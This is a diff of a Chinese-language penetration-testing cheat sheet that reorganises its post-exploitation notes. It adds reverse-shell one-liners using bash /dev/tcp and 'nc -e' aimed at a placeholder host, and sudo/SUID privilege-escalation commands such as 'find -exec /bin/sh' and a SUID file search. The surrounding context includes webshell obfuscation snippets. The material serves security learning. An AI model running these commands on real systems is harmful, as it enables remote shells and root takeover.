@@ -641,8 +641,6 @@ C:\boot.ini
 C:\WINDOWS\win.ini
 ```
 
-
-
 ## XXE
 
 ```xml
@@ -665,31 +663,6 @@ C:\WINDOWS\win.ini
 ```
 
 # 后渗透
-
-[GTFOBins](https://gtfobins.github.io/)收录了许多用Linux指令绕过操作系统安全策略的方法
-
-## sudo与SUID提权
-
-sudo和SUID都能让用户暂时以更高权限进行操作。使用sudo命令时、运行具有SUID的命令时，可以暂时获得其他用户权限。若系统配置不当，利用sudo与SUID可以暂时获取root用户权限，则可能用于提权
-
-```bash
-# 查看可以sudo的命令
-sudo -l
-
-# 查找SUID=1、所有者是root的文件
-find / -perm -u=s -user root -type f 2>/dev/null
-```
-
-sudo、SUID提权有几类方法：
-
-- 执行任意命令获取Shell。如：`find`，`vim`
-- 覆盖文件
-- 读取`/etc/shadow`并爆破密码，如`cp`，`wget`
-
-```bash
-find /etc/passwd -exec whoami \;  # 每找到一个结果，就会执行一次-exec参数指定的命令
-find /etc/passwd -exec /bin/sh \;
-```
 
 ## webshell
 
@@ -723,6 +696,40 @@ $g = $_GET['xymhwv']; # 动态传入参数
 $a = gettype([])[0];  # gettype([]) = 'array'，因此给$x赋值为'a'
 
 parse_str('a=1');     # 作为URL参数解析。PHP 8以前会直接赋值
+```
+
+## 反弹Shell
+
+控制端监听某个端口，被控端发起连接。连接方向和普通Shell相反，因此称作反弹Shell（Reverse Shell）。如果被控端位于内网，或者防火墙入站规则阻止外部连接，就可以使用反弹Shell
+
+```bash
+bash -i >& /dev/tcp/ip/port 0>&1  # 简单方便。需要bash和dev权限
+nc -e /bin/bash ip port           # 需要目标安装了nc
+```
+
+## 提权
+
+[GTFOBins](https://gtfobins.github.io/)收录了许多用Linux指令绕过操作系统安全策略的方法
+
+sudo和SUID都能让用户暂时以更高权限进行操作。使用sudo命令时、运行具有SUID的命令时，可以暂时获得其他用户权限。若系统配置不当，利用sudo与SUID可以暂时获取root用户权限，则可能用于提权
+
+```bash
+# 查看可以sudo的命令
+sudo -l
+
+# 查找SUID=1、所有者是root的文件
+find / -perm -u=s -user root -type f 2>/dev/null
+```
+
+sudo、SUID提权有几类方法：
+
+- 执行任意命令获取Shell。如：`find`，`vim`
+- 覆盖文件
+- 读取`/etc/shadow`并爆破密码，如`cp`，`wget`
+
+```bash
+find /etc/passwd -exec whoami \;  # 每找到一个结果，就会执行一次-exec参数指定的命令
+find /etc/passwd -exec /bin/sh \;
 ```
 
 # 渗透思路
